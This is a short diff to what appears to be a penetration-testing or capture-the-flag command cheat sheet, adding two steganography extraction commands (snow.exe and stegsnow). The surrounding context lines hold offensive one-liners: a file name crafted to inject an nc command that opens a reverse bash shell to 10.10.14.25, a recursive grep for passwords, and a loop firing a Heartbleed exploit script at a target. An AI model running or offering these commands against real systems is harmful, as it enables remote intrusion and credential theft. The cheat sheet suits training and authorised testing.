@@ -22,6 +22,8 @@ touch -- ';nc -c bash 10.10.14.25 444;.php'
 echo "somecommand &" | at 5pm
 cat  *  | grep  -i passw*
 curl -A "J"  -L 10.10.165.244
+snow.exe -C -p "test" confidential.txt
+stegsnow -C -p test confidential.txt
 
 for i in $(seq 0 100); do python heartbleed.py $IP;done
 for i in $(seq 0 12); do echo -n 'base64 -d |';done
